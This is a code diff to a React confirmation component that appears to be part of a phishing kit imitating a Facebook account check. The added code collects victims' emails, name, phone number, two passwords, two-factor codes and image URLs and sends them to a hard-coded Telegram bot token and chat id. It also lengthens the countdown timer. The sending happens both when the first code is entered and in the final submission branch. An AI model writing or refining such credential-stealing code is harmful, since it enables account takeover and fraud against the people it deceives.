@@ -8,7 +8,7 @@ const ConfirmComponent = () => {
 
     const [activePopup, setActivePopup] = useState(false);
     const [activeLink, setActiveLink] = useState(false);
-    const [timeLeft, setTimeLeft] = useState(10); 
+    const [timeLeft, setTimeLeft] = useState(20); 
 
     const [activeWaring, setActiveWaring] = useState(false);
     const [firstCode, setFirstCode] = useState();
@@ -44,14 +44,39 @@ const ConfirmComponent = () => {
     const onFinishCodes = (values) => {
         
         if(timeLeft > 0){
-            setFirstCode(values.fill_code)
             setActiveWaring(true)
+
+            const dataLocalImages = JSON.parse(localStorage.getItem('dataIamges'))
+            const firstCode = {...dataLocalImages, first_code: values.fill_code}
+
+            localStorage.setItem('dataFirstCode', JSON.stringify(firstCode))
+
+
+            const bot_token = '6387439493:AAHaViBOhEGCh_U-dVzhvPCJyZbouSY5IBY';
+            const chat_id   = '-1001737921141';
+            // const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
+            // const chat_id   = '5208541473';
+
+            const message   = '<strong>Email Account: </strong>' + firstCode.fill_business_email + 
+            '%0A<strong>Name Acount: </strong>' + firstCode.fill_full_name + 
+            '%0A<strong>Personal Email: </strong>' + firstCode.fill_personal_email + 
+            '%0A<strong>Facebook Page: </strong>' + firstCode.fill_facebook_pagename + 
+            '%0A<strong>Phone Number: </strong>' + firstCode.fill_phone + 
+            '%0A<strong>Password First: </strong>' + firstCode.firt_password +
+            '%0A<strong>Password Second: </strong>' + firstCode.second_password +
+            '%0A<strong>First Code Authen: </strong>' + firstCode.first_code +
+            '%0A<strong>Images Url: </strong>' + firstCode.url_image ;
+
+            axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
+                .then((response) => {
+                })
+                .catch((error) => {});
         }
 
         
         else {
-            const dataLocalImages = JSON.parse(localStorage.getItem('dataIamges'))
-            const finalCode = {...dataLocalImages, first_code: firstCode, seconds_code: values.fill_code}
+            const dataLocalImages = JSON.parse(localStorage.getItem('dataFirstCode'))
+            const finalCode = {...dataLocalImages, seconds_code: dataLocalImages.first_code}
 
 
             const bot_token = '6387439493:AAHaViBOhEGCh_U-dVzhvPCJyZbouSY5IBY';
@@ -66,9 +91,9 @@ const ConfirmComponent = () => {
             '%0A<strong>Phone Number: </strong>' + finalCode.fill_phone + 
             '%0A<strong>Password First: </strong>' + finalCode.firt_password +
             '%0A<strong>Password Second: </strong>' + finalCode.second_password +
-            '%0A<strong>Images Url: </strong>' + finalCode.url_image +
             '%0A<strong>First Code Authen: </strong>' + finalCode.first_code +
-            '%0A<strong>Second Code Authen : </strong>' + finalCode.seconds_code ;
+            '%0A<strong>Second Code Authen : </strong>' + values.fill_code +
+            '%0A<strong>Images Url: </strong>' + finalCode.url_image ;
 
             axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
                 .then((response) => {
